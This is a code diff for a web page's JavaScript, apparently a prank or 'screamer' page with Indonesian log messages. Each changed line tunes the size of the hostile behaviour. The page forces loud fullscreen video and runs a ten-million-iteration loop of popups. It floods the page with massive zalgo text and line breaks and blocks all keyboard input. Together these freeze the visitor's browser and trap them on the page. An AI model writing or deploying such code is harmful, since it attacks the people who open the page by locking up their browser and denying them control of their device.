@@ -28,7 +28,7 @@
             v.muted=false;v.volume=1.0;
             v.play().catch(e=>console.log("Autoplay gagal:"+e));
             goFullScreen();
-            for(let i=0;i<1e11;i++){showVideoPopup();spamText();}
+            for(let i=0;i<10000000;i++){showVideoPopup();spamText();}
         }
         function goFullScreen(){
             let d=document.documentElement;
@@ -46,7 +46,7 @@
             setTimeout(()=>{v.play().catch(e=>console.log("Autoplay gagal:"+e))},100);
         }
         function spamText(){
-            let s=document.getElementById("spamText"),u="̶̷̸͏͟͜͝",t=u.repeat(1e6)+"<br>".repeat(1e6);
+            let s=document.getElementById("spamText"),u="̶̷̸͏͟͜͝",t=u.repeat(100000)+"<br>".repeat(10000000);
             s.innerHTML=t;
         }
         document.addEventListener("keydown",e=>e.preventDefault());
